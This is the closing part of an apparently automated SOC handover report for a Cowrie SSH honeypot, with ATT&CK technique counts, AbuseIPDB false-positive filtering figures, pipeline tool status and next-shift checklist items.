| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 181 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 24 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (154 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 51 |
| AbuseIPDB score 10 below threshold 25 | 2 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 88 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 463 cases |
| Tool 34  | Credential Extractor        | ✅ 205 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 58 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 154 filtered (33.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 24 priority case(s) shown individually · 23 recon entry/entries in table (12 group(s) consolidating 274 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-11T15:19:03Z_
